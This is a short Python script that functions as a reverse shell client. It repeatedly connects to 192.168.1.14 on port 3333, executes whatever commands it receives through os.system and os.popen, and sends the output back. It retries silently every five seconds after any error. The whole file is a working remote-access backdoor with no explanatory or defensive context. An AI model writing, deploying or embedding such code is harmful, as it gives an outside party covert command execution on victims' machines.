from socket import *
import os
import time

while True:
    try:

        client = socket(AF_INET, SOCK_STREAM)
        client.connect(("192.168.1.14", 3333))

        print("Client Connected")

        while True:
            data = client.recv(2048).decode()

            if data == "exit":
                client.close()
                break

            if os.system(data) == 1:
                result = "Error: Invalid command"
            else:
                result = os.popen(data).read()

            client.sendall(result.encode())
    except:
        print("Connection Error")
        time.sleep(5)
        continue